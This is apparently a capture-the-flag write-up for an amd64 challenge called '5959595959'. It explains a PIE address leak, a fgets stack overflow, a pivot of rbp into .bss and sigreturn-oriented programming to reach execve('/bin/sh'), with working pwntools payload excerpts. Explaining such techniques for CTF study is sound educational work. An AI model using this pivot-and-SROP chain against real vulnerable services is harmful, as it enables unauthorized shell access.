---
title: "5959595959"
area: signals-syscalls
role: author
event: pioneers25
published: 2026-03-20
summary: "A stack overflow pivots the frame into .bss, then plants a SigreturnFrame there and SROPs into execve(\"/bin/sh\")."
techniques: ["stack overflow", "SROP", "stack pivot", "sigreturn"]
difficulty: hard
arch: amd64
---

## Overview
This is a classic amd64 SROP (Sigreturn-Oriented Programming) challenge.

The binary:
- leaks a code pointer (PIE base)
- has a large `fgets()` overflow into a small stack buffer
- contains a `syscall` instruction

The solver uses a two-stage overflow:
1) pivot `rbp` into `.bss` and re-enter `vuln()` so that the next `fgets()` writes into `.bss`  
2) place a fake `SigreturnFrame` in `.bss`, set `rax=15`, and jump to `syscall` to trigger sigreturn, then do `execve("/bin/sh",0,0)`

## Vulnerability analysis

### PIE leak
`vuln()` prints the address of itself:

```c
printf("I have %li things to do!\n", &vuln);
```

That value lets us compute the PIE base by subtracting the known symbol offset of `vuln`.

### Stack overflow
`buf` is 0x20 bytes, but `fgets()` reads up to 0x200 bytes:

```c
char buf[0x20];
fgets(buf, 0x200, stdin);
```

So we can smash:
- the local `i` value (`unsigned long int i`)
- saved `rbp`
- saved `rip`

### Why SROP works here
There’s a `syscall` instruction available (via `callme()` or a gadget), and there’s no stack canary (`-fno-stack-protector`).

If we can reach a `syscall` with `rax = 15`, the kernel treats it as `rt_sigreturn` and loads register state from a frame at `rsp`.

## Exploitation strategy (matches `solve.py`)

### Step 1 — Parse the leak and compute addresses
Solver excerpt:

```python
p.recvuntil(b"have ")
e.address = int(p.recvuntil(b" ")[:-1]) - e.sym.vuln
bss = e.address + 0x4700
syscall = e.address + 0x116d
```

This sets:
- `e.address` = PIE base
- `bss` = a writable pivot area
- `syscall` = gadget/function containing `syscall`

### Step 2 — Stage-1 overflow: pivot into `.bss` and re-enter `vuln`
Key idea: `vuln()` uses `rbp`-relative addressing for locals. If we return to a point inside `vuln()` after the prologue, with a controlled `rbp`, the next `fgets()` will write to `rbp-0x20` (our chosen area in `.bss`).

Solver excerpt:

```python
payload = (
	b"a"*40
	+ p64(0) + p64(0)
	+ p64(poprbp) + p64(bss)
	+ p64(e.sym.vuln + 46)
)
p.sendline(payload)
```

What this accomplishes:
- overflow reaches the return chain
- `pop rbp; ret` sets `rbp = bss`
- returning into `vuln+46` reaches the `fgets()` path again, but now the “stack frame” lives in `.bss`

### Step 3 — Stage-2 write into `.bss`: build SROP chain
We want:
- `rax = 15` right before executing `syscall` (to trigger sigreturn)
- a `SigreturnFrame` laid out at `rsp` after the return

The solver crafts the `.bss` content like this:

```python
frame = SigreturnFrame()
frame.rax = 59            # execve
frame.rdi = bss - 0x30    # "/bin/sh" address
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload_bss  = b"/bin/sh\x00"
payload_bss += b"a"*0x20
payload_bss += p64(15)        # i => returned in rax
payload_bss += p64(0)         # saved rbp
payload_bss += p64(syscall)   # saved rip: execute syscall with rax=15
payload_bss += bytes(frame)   # sigreturn frame consumed by kernel

p.sendline(payload_bss)
```

Why the `p64(15)` matters:
- `vuln()` ends with `return i;`
- on amd64, return value is in `rax`
- so we arrange `i = 15`, making `rax=15` when we immediately `ret` into the `syscall` gadget
- `syscall` with `rax=15` triggers sigreturn, loading our frame and then doing `syscall` again as `execve`

## Result
After the sigreturn, registers are set for `execve("/bin/sh", NULL, NULL)` and the exploit drops to an interactive shell.
